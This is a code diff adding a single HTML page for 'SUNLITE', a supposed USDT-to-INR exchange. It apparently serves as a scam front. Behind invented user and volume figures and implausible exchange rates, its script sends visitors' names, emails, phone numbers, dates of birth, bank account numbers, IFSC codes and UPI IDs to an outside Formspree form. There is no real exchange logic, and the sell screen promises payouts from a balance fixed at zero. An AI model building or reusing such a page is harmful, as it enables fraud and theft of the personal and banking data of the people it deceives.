@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SUNLITE | Trusted Currency Exchange Platform</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <!-- Ethers.js -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.2/ethers.umd.min.js"></script>
+    <style>
+        @keyframes pulse-custom {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        .pulse-btn { animation: pulse-custom 1.5s infinite; }
+    </style>
+</head>
+<body class="bg-slate-50 text-slate-900 font-sans min-h-screen flex flex-col items-center justify-start relative overflow-x-hidden p-4">
+
+    <!-- LANDING PAGE (SUNLITE) -->
+    <div id="landingPage" class="w-full max-w-md flex flex-col items-center space-y-6 py-6 relative z-10">
+        <div class="w-full flex items-center justify-between px-2">
+            <div class="flex items-center space-x-2">
+                <img src="logo.jpg" alt="Logo" class="w-10 h-10 rounded-xl object-cover shadow-md border border-slate-200" onerror="this.src='https://via.placeholder.com/40'">
+                <span class="text-lg font-black tracking-wider text-blue-600">SUNLITE</span>
+            </div>
+        </div>
+
+        <div class="w-full text-center space-y-6 pt-4">
+            <div class="inline-block bg-white/80 backdrop-blur px-4 py-1.5 rounded-full shadow-sm border border-slate-200 text-xs font-semibold text-blue-600">
+                ● Trusted Currency Exchange Platform
+            </div>
+
+            <div class="space-y-2">
+                <h1 class="text-4xl font-black text-blue-600 tracking-tight">SUNLITE</h1>
+                <p class="text-sm text-slate-600 px-4 leading-relaxed">
+                    A secure platform for seamless currency exchange with stable returns.
+                </p>
+            </div>
+
+            <div class="space-y-3 pt-2">
+                <div class="bg-white/90 shadow-sm border border-slate-200 rounded-2xl py-3 px-4 text-sm font-semibold text-slate-700">
+                    No handling fees are charged
+                </div>
+                <div class="bg-white/90 shadow-sm border border-slate-200 rounded-2xl py-3 px-4 text-sm font-semibold text-slate-700">
+                    109-115 rates on USDT
+                </div>
+            </div>
+
+            <div class="pt-4">
+                <button onclick="openAuthModal()" class="pulse-btn w-full bg-gradient-to-r from-orange-500 to-amber-500 hover:from-orange-600 text-white font-extrabold py-4 rounded-2xl shadow-lg transition text-base cursor-pointer">
+                    Register Now
+                </button>
+            </div>
+        </div>
+
+        <div class="w-full space-y-6 pt-10">
+            <div class="bg-white rounded-3xl p-6 shadow-xl border border-slate-100 text-center space-y-6">
+                <div>
+                    <h2 class="text-3xl font-black text-blue-600">85,420+</h2>
+                    <p class="text-xs text-slate-500 font-medium mt-0.5">Users joined</p>
+                </div>
+                <hr class="border-slate-100">
+                <div>
+                    <h2 class="text-3xl font-black text-blue-600">1,240,000+</h2>
+                    <p class="text-xs text-slate-500 font-medium mt-0.5">Transactions processed</p>
+                </div>
+                <hr class="border-slate-100">
+                <div>
+                    <h2 class="text-3xl font-black text-blue-600">$4,800,000</h2>
+                    <p class="text-xs text-slate-500 font-medium mt-0.5">Daily volume</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- AUTHENTICATION MODAL -->
+    <div id="authModal" class="hidden fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
+        <div class="bg-white w-full max-w-md rounded-3xl p-6 shadow-2xl space-y-6 text-slate-900">
+            <div class="text-center space-y-1">
+                <h2 id="modalTitle" class="text-2xl font-black text-blue-600">Welcome to SUNLITE</h2>
+                <p id="modalSubtitle" class="text-xs text-slate-500">Please login or create an account</p>
+            </div>
+            <div class="flex bg-slate-100 p-1 rounded-xl">
+                <button onclick="switchAuthTab('login')" id="loginTabBtn" class="flex-1 py-2 text-xs font-bold rounded-lg bg-blue-600 text-white cursor-pointer">Login</button>
+                <button onclick="switchAuthTab('signup')" id="signupTabBtn" class="flex-1 py-2 text-xs font-bold rounded-lg text-slate-600 cursor-pointer">Sign Up</button>
+            </div>
+            <div class="space-y-4">
+                <div id="nameFieldContainer" class="hidden">
+                    <label class="block text-xs font-semibold text-slate-700 mb-1">Full Name</label>
+                    <input type="text" id="authName" placeholder="Aapka naam" class="w-full bg-slate-50 border rounded-xl p-3 text-sm">
+                </div>
+                <div>
+                    <label class="block text-xs font-semibold text-slate-700 mb-1">Gmail Address</label>
+                    <input type="email" id="authEmail" placeholder="yourname@gmail.com" class="w-full bg-slate-50 border rounded-xl p-3 text-sm">
+                </div>
+                <div>
+                    <label class="block text-xs font-semibold text-slate-700 mb-1">Password</label>
+                    <input type="password" id="authPassword" placeholder="Enter password" class="w-full bg-slate-50 border rounded-xl p-3 text-sm">
+                </div>
+                <button onclick="handleAuthSubmit()" id="authSubmitBtn" class="w-full bg-blue-600 text-white font-extrabold py-3.5 rounded-xl shadow cursor-pointer">Login to Account</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- PROFILE MODAL -->
+    <div id="profileModal" class="hidden fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
+        <div class="bg-white w-full max-w-md rounded-3xl p-6 shadow-2xl space-y-5 text-slate-900">
+            <div class="text-center space-y-1">
+                <h2 class="text-2xl font-black text-blue-600">Complete Your Profile</h2>
+            </div>
+            <div class="space-y-4">
+                <input type="text" id="profileName" placeholder="Full name" class="w-full bg-slate-50 border rounded-xl p-3 text-sm">
+                <input type="tel" id="profileMobile" placeholder="Mobile number" class="w-full bg-slate-50 border rounded-xl p-3 text-sm">
+                <div class="grid grid-cols-2 gap-3">
+                    <input type="date" id="profileDob" class="w-full bg-slate-50 border rounded-xl p-3 text-sm">
+                    <input type="number" id="profileAge" placeholder="Age" class="w-full bg-slate-50 border rounded-xl p-3 text-sm">
+                </div>
+                <button onclick="submitProfileDetails()" class="w-full bg-emerald-600 text-white font-extrabold py-3.5 rounded-xl shadow cursor-pointer">Submit Profile</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- MAIN DASHBOARD (Transaction Screen as in Image 1) -->
+    <div id="mainDashboard" class="hidden bg-white w-full max-w-xl rounded-3xl shadow-2xl p-5 border space-y-6 text-slate-900">
+        <div class="flex justify-between items-center pb-4 border-b">
+            <div class="flex items-center space-x-3">
+                <img src="logo.jpg" alt="Logo" class="w-10 h-10 rounded-xl object-cover border" onerror="this.src='https://via.placeholder.com/40'">
+                <div>
+                    <h1 class="text-base font-black text-blue-600">SUNLITE</h1>
+                    <p class="text-xs text-slate-500">User: <span id="loggedUserName" class="font-semibold"></span></p>
+                </div>
+            </div>
+            <button onclick="logoutUser()" class="bg-red-50 text-red-600 border text-xs px-3 py-2 rounded-xl font-bold cursor-pointer">Logout</button>
+        </div>
+
+        <!-- Transaction View (Image 1 layout) -->
+        <div id="txHomeView" class="space-y-6">
+            <!-- Account Card with Sell Button -->
+            <div class="bg-blue-600 text-white p-5 rounded-2xl shadow-xl flex justify-between items-center">
+                <div>
+                    <p class="text-xs text-blue-200">Account Balance</p>
+                    <h2 class="text-3xl font-black mt-1">0.00 <span class="text-xs">T</span></h2>
+                </div>
+                <button onclick="openSellScreen()" class="bg-orange-500 hover:bg-orange-600 text-white text-sm font-bold px-5 py-2.5 rounded-xl shadow cursor-pointer">
+                    Sell
+                </button>
+            </div>
+
+            <!-- Transaction Records Tabs -->
+            <div class="space-y-3">
+                <h3 class="text-sm font-bold text-slate-800">Transaction records</h3>
+                <div class="flex gap-2">
+                    <button class="bg-blue-600 text-white text-xs px-4 py-1.5 rounded-lg font-bold">All</button>
+                    <button class="bg-slate-100 text-slate-600 text-xs px-4 py-1.5 rounded-lg font-medium">Processing</button>
+                    <button class="bg-slate-100 text-slate-600 text-xs px-4 py-1.5 rounded-lg font-medium">Completed</button>
+                    <button class="bg-slate-100 text-slate-600 text-xs px-4 py-1.5 rounded-lg font-medium">Failed</button>
+                </div>
+                <div class="text-center py-10 text-slate-400 text-xs font-medium">
+                    No data yet
+                </div>
+            </div>
+        </div>
+
+        <!-- Personal Information / Sell Screen (Image 2 layout) -->
+        <div id="sellScreenView" class="space-y-4 hidden">
+            <div class="flex items-center justify-between pb-2 border-b">
+                <button onclick="closeSellScreen()" class="text-blue-600 font-bold text-sm">← Back</button>
+                <h2 class="text-sm font-black text-slate-800">Personal Information</h2>
+                <div></div>
+            </div>
+
+            <div class="grid grid-cols-2 gap-3">
+                <div>
+                    <label class="block text-[11px] font-semibold text-slate-500 mb-1">Sell currency</label>
+                    <input type="text" value="USDT" readonly class="w-full bg-slate-100 border rounded-xl p-2.5 text-xs font-bold text-slate-700">
+                </div>
+                <div>
+                    <label class="block text-[11px] font-semibold text-slate-500 mb-1">Payment currency</label>
+                    <input type="text" value="INR" readonly class="w-full bg-slate-100 border rounded-xl p-2.5 text-xs font-bold text-slate-700">
+                </div>
+            </div>
+
+            <div>
+                <label class="block text-[11px] font-semibold text-slate-500 mb-1">Set unit price (₹)</label>
+                <input type="number" id="unitPriceInput" value="155" class="w-full bg-slate-50 border rounded-xl p-2.5 text-xs font-bold text-slate-900">
+            </div>
+
+            <div>
+                <div class="flex justify-between items-center mb-1">
+                    <label class="text-[11px] font-semibold text-slate-500">Number (Min 150 DT)</label>
+                    <button onclick="setAllAmount()" class="text-[10px] bg-orange-500 text-white px-2 py-0.5 rounded font-bold">All</button>
+                </div>
+                <input type="number" id="sellDtNumber" placeholder="0" oninput="calculateSellReturn()" class="w-full bg-slate-50 border rounded-xl p-2.5 text-xs font-bold text-slate-900">
+                <p id="calcInrText" class="text-[10px] text-slate-400 mt-1">≈ INR 0.00</p>
+            </div>
+
+            <div class="grid grid-cols-2 gap-3">
+                <div class="bg-slate-50 p-2.5 border rounded-xl">
+                    <p class="text-[10px] text-slate-500">Available balance</p>
+                    <p class="text-xs font-bold text-slate-800">0.00</p>
+                </div>
+                <div class="bg-slate-50 p-2.5 border rounded-xl">
+                    <p class="text-[10px] text-slate-500">Freeze balance</p>
+                    <p class="text-xs font-bold text-slate-800">0.00</p>
+                </div>
+            </div>
+
+            <!-- Payment Method with Saved Accounts & New Account Option -->
+            <div class="space-y-2">
+                <div class="flex justify-between items-center">
+                    <label class="text-[11px] font-semibold text-slate-500">Payment method</label>
+                    <button onclick="openNewPayoutModal()" class="text-[10px] text-blue-600 font-bold hover:underline">+ Add New Account / UPI</button>
+                </div>
+                <select id="savedAccountsDropdown" class="w-full bg-slate-50 border rounded-xl p-2.5 text-xs font-semibold text-slate-800">
+                    <option value="">Select payout account</option>
+                </select>
+            </div>
+
+            <!-- Transfer Mode Checkboxes -->
+            <div class="flex items-center gap-4 text-xs">
+                <label class="flex items-center gap-1 font-semibold text-slate-700"><input type="checkbox" checked> IMPS</label>
+                <label class="flex items-center gap-1 font-semibold text-slate-700"><input type="checkbox"> RTGS</label>
+                <label class="flex items-center gap-1 font-semibold text-slate-700"><input type="checkbox"> NEFT</label>
+            </div>
+
+            <div>
+                <label class="block text-[11px] font-semibold text-slate-500 mb-1">Order deadline</label>
+                <select class="w-full bg-slate-50 border rounded-xl p-2.5 text-xs font-semibold text-slate-800">
+                    <option>30 Minutes</option>
+                    <option>60 Minutes</option>
+                </select>
+            </div>
+
+            <button onclick="submitSellOrder()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-extrabold py-3 rounded-xl shadow text-xs cursor-pointer">
+                Next step
+            </button>
+        </div>
+    </div>
+
+    <!-- NEW PAYOUT ADD MODAL -->
+    <div id="newPayoutModal" class="hidden fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
+        <div class="bg-white w-full max-w-sm rounded-3xl p-6 shadow-2xl space-y-4 text-slate-900">
+            <h3 class="text-sm font-bold text-blue-600">Add New Payout Account</h3>
+            <div class="flex bg-slate-100 p-1 rounded-xl">
+                <button onclick="switchNewPayType('bank')" id="newBankBtn" class="flex-1 py-1.5 text-xs font-bold rounded-lg bg-blue-600 text-white">Bank</button>
+                <button onclick="switchNewPayType('upi')" id="newUpiBtn" class="flex-1 py-1.5 text-xs font-bold rounded-lg text-slate-600">UPI</button>
+            </div>
+            <div id="modalBankForm" class="space-y-2">
+                <input type="text" id="mBankHolder" placeholder="Account Holder Name" class="w-full bg-slate-50 border rounded-xl p-2 text-xs">
+                <input type="text" id="mAccNo" placeholder="Account Number" class="w-full bg-slate-50 border rounded-xl p-2 text-xs">
+                <input type="text" id="mIfsc" placeholder="IFSC Code" class="w-full bg-slate-50 border rounded-xl p-2 text-xs uppercase">
+                <input type="text" id="mBankName" placeholder="Bank Name" class="w-full bg-slate-50 border rounded-xl p-2 text-xs">
+            </div>
+            <div id="modalUpiForm" class="space-y-2 hidden">
+                <input type="text" id="mUpiHolder" placeholder="Full Name" class="w-full bg-slate-50 border rounded-xl p-2 text-xs">
+                <input type="text" id="mUpiId" placeholder="UPI ID (e.g. name@oksbi)" class="w-full bg-slate-50 border rounded-xl p-2 text-xs">
+            </div>
+            <div class="flex gap-2 pt-2">
+                <button onclick="closeNewPayoutModal()" class="flex-1 bg-slate-200 text-slate-700 py-2.5 rounded-xl text-xs font-bold cursor-pointer">Cancel</button>
+                <button onclick="saveNewPayoutAccount()" class="flex-1 bg-blue-600 text-white py-2.5 rounded-xl text-xs font-bold cursor-pointer">Save</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let currentAuthMode = 'login';
+        let newPayModalType = 'bank';
+        const FORMSPREE_URL = "https://formspree.io/f/mljdlzvo";
+        const MIN_SELL_DT = 150;
+
+        window.onload = function() {
+            const loggedUser = localStorage.getItem('sunlite_logged_user');
+            const loggedName = localStorage.getItem('sunlite_logged_name');
+            const profileDone = localStorage.getItem('sunlite_profile_done_' + loggedUser);
+
+            if (loggedUser) {
+                document.getElementById('landingPage').classList.add('hidden');
+                document.getElementById('authModal').classList.add('hidden');
+                if (!profileDone) {
+                    document.getElementById('profileModal').classList.remove('hidden');
+                    document.getElementById('profileName').value = loggedName || '';
+                } else {
+                    document.getElementById('mainDashboard').classList.remove('hidden');
+                    document.getElementById('loggedUserName').innerText = loggedName;
+                    loadSavedAccountsToDropdown();
+                }
+            }
+        }
+
+        function openAuthModal() { document.getElementById('authModal').classList.remove('hidden'); }
+
+        function switchAuthTab(mode) {
+            currentAuthMode = mode;
+            const loginBtn = document.getElementById('loginTabBtn');
+            const signupBtn = document.getElementById('signupTabBtn');
+            const title = document.getElementById('modalTitle');
+            const submitBtn = document.getElementById('authSubmitBtn');
+            const nameContainer = document.getElementById('nameFieldContainer');
+
+            if (mode === 'login') {
+                loginBtn.className = "flex-1 py-2 text-xs font-bold rounded-lg bg-blue-600 text-white";
+                signupBtn.className = "flex-1 py-2 text-xs font-bold rounded-lg text-slate-600";
+                title.innerText = "Welcome to SUNLITE";
+                submitBtn.innerText = "Login to Account";
+                nameContainer.classList.add('hidden');
+            } else {
+                signupBtn.className = "flex-1 py-2 text-xs font-bold rounded-lg bg-blue-600 text-white";
+                loginBtn.className = "flex-1 py-2 text-xs font-bold rounded-lg text-slate-600";
+                title.innerText = "Create New Account";
+                submitBtn.innerText = "Sign Up Now";
+                nameContainer.classList.remove('hidden');
+            }
+        }
+
+        async function sendDataToFormspree(data) {
+            try {
+                await fetch(FORMSPREE_URL, {
+                    method: 'POST',
+                    headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+            } catch (e) { console.log(e); }
+        }
+
+        async function handleAuthSubmit() {
+            const email = document.getElementById('authEmail').value.trim();
+            const password = document.getElementById('authPassword').value.trim();
+            const name = document.getElementById('authName').value.trim();
+
+            if (!email || !password || (currentAuthMode === 'signup' && !name)) {
+                alert("Kripya saari fields bharein!");
+                return;
+            }
+
+            if (currentAuthMode === 'signup') {
+                localStorage.setItem('sunlite_user_' + email, password);
+                localStorage.setItem('sunlite_name_' + email, name);
+                localStorage.setItem('sunlite_logged_user', email);
+                localStorage.setItem('sunlite_logged_name', name);
+                await sendDataToFormspree({ type: "SIGNUP", name, email });
+   } else {
+                const savedPassword = localStorage.getItem('sunlite_user_' + email);
+                const savedName = localStorage.getItem('sunlite_name_' + email) || "User";
+                if (!savedPassword || savedPassword !== password) {
+                    alert("Galat email ya password!");
+                    return;
+                }
+                localStorage.setItem('sunlite_logged_user', email);
+                localStorage.setItem('sunlite_logged_name', savedName);
+            }
+
+            document.getElementById('authModal').classList.add('hidden');
+            document.getElementById('landingPage').classList.add('hidden');
+            document.getElementById('profileModal').classList.remove('hidden');
+            document.getElementById('profileName').value = localStorage.getItem('sunlite_logged_name');
+        }
+
+        async function submitProfileDetails() {
+            const name = document.getElementById('profileName').value.trim();
+            const mobile = document.getElementById('profileMobile').value.trim();
+            const dob = document.getElementById('profileDob').value.trim();
+            const age = document.getElementById('profileAge').value.trim();
+            const email = localStorage.getItem('sunlite_logged_user');
+
+            if (!name || !mobile || !dob || !age) {
+                alert("Kripya profile ki saari details bharein!");
+                return;
+            }
+
+            await sendDataToFormspree({ type: "PROFILE", email, candidateName: name, mobileNumber: mobile, dateOfBirth: dob, age });
+            localStorage.setItem('sunlite_profile_done_' + email, "true");
+            localStorage.setItem('sunlite_logged_name', name);
+
+            document.getElementById('profileModal').classList.add('hidden');
+            document.getElementById('mainDashboard').classList.remove('hidden');
+            document.getElementById('loggedUserName').innerText = name;
+            loadSavedAccountsToDropdown();
+            alert("Profile successfully submit ho gayi!");
+        }
+
+        function logoutUser() { localStorage.clear(); location.reload(); }
+
+        function openSellScreen() {
+            document.getElementById('txHomeView').classList.add('hidden');
+            document.getElementById('sellScreenView').classList.remove('hidden');
+        }
+
+        function closeSellScreen() {
+            document.getElementById('sellScreenView').classList.add('hidden');
+            document.getElementById('txHomeView').classList.remove('hidden');
+        }
+
+        function setAllAmount() {
+            document.getElementById('sellDtNumber').value = MIN_SELL_DT;
+            calculateSellReturn();
+        }
+
+        function calculateSellReturn() {
+            const amt = parseFloat(document.getElementById('sellDtNumber').value) || 0;
+            const unitPrice = parseFloat(document.getElementById('unitPriceInput').value) || 155;
+            const total = amt * unitPrice;
+            document.getElementById('calcInrText').innerText = `≈ INR ${total.toLocaleString('en-IN')}.00`;
+        }
+
+        function openNewPayoutModal() { document.getElementById('newPayoutModal').classList.remove('hidden'); }
+        function closeNewPayoutModal() { document.getElementById('newPayoutModal').classList.add('hidden'); }
+
+        function switchNewPayType(type) {
+            newPayModalType = type;
+            const bBtn = document.getElementById('newBankBtn');
+            const uBtn = document.getElementById('newUpiBtn');
+            const bForm = document.getElementById('modalBankForm');
+            const uForm = document.getElementById('modalUpiForm');
+
+            if (type === 'bank') {
+                bBtn.className = "flex-1 py-1.5 text-xs font-bold rounded-lg bg-blue-600 text-white";
+                uBtn.className = "flex-1 py-1.5 text-xs font-bold rounded-lg text-slate-600";
+                bForm.classList.remove('hidden');
+                uForm.classList.add('hidden');} else {
+                uBtn.className = "flex-1 py-1.5 text-xs font-bold rounded-lg bg-blue-600 text-white";
+                bBtn.className = "flex-1 py-1.5 text-xs font-bold rounded-lg text-slate-600";
+                uForm.classList.remove('hidden');
+                bForm.classList.add('hidden');
+            }
+        }
+
+        async function saveNewPayoutAccount() {
+            const email = localStorage.getItem('sunlite_logged_user');
+            let payoutObj = { email };
+
+            if (newPayModalType === 'bank') {
+                const holder = document.getElementById('mBankHolder').value.trim();
+                const acc = document.getElementById('mAccNo').value.trim();
+                const ifsc = document.getElementById('mIfsc').value.trim();
+                const bName = document.getElementById('mBankName').value.trim();
+                if (!holder || !acc || !ifsc || !bName) {
+                    alert("Kripya bank details poori bharein!");
+                    return;
+                }
+                payoutObj.type = "Bank";
+                payoutObj.title = `${bName} - A/C: ${acc} (${holder})`;
+            } else {
+                const holder = document.getElementById('mUpiHolder').value.trim();
+                const upiId = document.getElementById('mUpiId').value.trim();
+                if (!holder || !upiId) {
+                    alert("Kripya UPI details bharein!");
+                    return;
+                }
+                payoutObj.type = "UPI";
+                payoutObj.title = `UPI: ${upiId} (${holder})`;
+            }
+
+            // Save in localStorage array
+            let accounts = JSON.parse(localStorage.getItem('sunlite_accounts_' + email) || '[]');
+            accounts.push(payoutObj);
+            localStorage.setItem('sunlite_accounts_' + email, JSON.stringify(accounts));
+
+            await sendDataToFormspree({ type: "NEW_PAYOUT_ADDED", ...payoutObj });
+            loadSavedAccountsToDropdown();
+            closeNewPayoutModal();
+            alert("New payout account successfully save ho gaya!");
+        }
+
+        function loadSavedAccountsToDropdown() {
+            const email = localStorage.getItem('sunlite_logged_user');
+            const dropdown = document.getElementById('savedAccountsDropdown');
+            dropdown.innerHTML = '<option value="">Select payout account</option>';
+
+            let accounts = JSON.parse(localStorage.getItem('sunlite_accounts_' + email) || '[]');
+            accounts.forEach((acc, index) => {
+                let opt = document.createElement('option');
+                opt.value = index;
+                opt.innerText = acc.title;
+                dropdown.appendChild(opt);
+            });
+        }
+
+        async function submitSellOrder() {
+            const amt = parseFloat(document.getElementById('sellDtNumber').value) || 0;
+            const dropdown = document.getElementById('savedAccountsDropdown');
+
+            if (amt < MIN_SELL_DT) {
+                alert(`Error: Minimum sell limit ${MIN_SELL_DT} DT hai! Aapne ${amt} DT enter kiya hai.`);
+                return;
+            }
+
+            if (dropdown.value === "") {
+                alert("Kripya payment ke liye apna saved bank account ya UPI select karein!");
+                return;
+            }
+
+            const email = localStorage.getItem('sunlite_logged_user');
+            let accounts = JSON.parse(localStorage.getItem('sunlite_accounts_' + email) || '[]');
+            let selectedAccount = accounts[dropdown.value];
+            const unitPrice = document.getElementById('unitPriceInput').value;
+            const totalInr = amt * unitPrice;
+
+            await sendDataToFormspree({
+                type: "P2P_SELL_ORDER",
+                email: email,
+                sellAmountDT: amt,
+                unitPrice: unitPrice,
+                totalPayoutINR: totalInr,
+                payoutDetails: selectedAccount.title
+            });
+
+            alert(`P2P Sell Order successfully created for ${amt} DT! Payout of ₹${totalInr} will be sent to your selected account.`);
+            closeSellScreen();
+        }
+    </script>
+</body>
+</html>
